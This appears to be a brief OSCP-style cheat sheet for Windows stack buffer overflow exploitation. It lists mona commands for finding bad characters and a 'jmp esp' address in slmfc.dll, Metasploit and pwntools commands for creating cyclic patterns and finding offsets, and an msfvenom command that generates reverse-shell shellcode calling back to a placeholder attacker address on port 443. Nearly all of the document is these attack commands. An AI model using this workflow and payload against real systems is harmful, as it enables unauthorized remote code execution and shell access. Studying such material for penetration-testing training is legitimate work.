# Badchars

Hunt bad chars with mona: 

https://github.com/codingo/OSCP-2/blob/master/Documents/Hunting%20bad%20characters%20with%20mona.pdf

```sh
!mona config -set workingfolder c:\logs\%p
!mona bytearray -cbp "\x00"
!mona compare -f C:\logs\<program_name>\bytearray.bin -a <bad_chars_start_address>
```

Find jump esp

```sh
!mona modules
!mona find -s "\xff\xe4" -m slmfc.dll
```

Pattern create commands

```sh
/opt/metasploit/tools/exploit/pattern_create.rb -l 900
/usr/share/metasploit-framework/tools/pattern_create.rb -l 900
pwn cyclic 900
```

Pattern offset commands

```sh
/opt/metasploit/tools/exploit/pattern_offset.rb -q 35724134
/usr/share/metasploit-framework/tools/pattern_offset.rb -q 35724134
pwn cyclic -l <offset>
```

Shellcode

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=XX.XX.XX.XX LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e" -f c -a x86 --platform windows -v shellcode
```

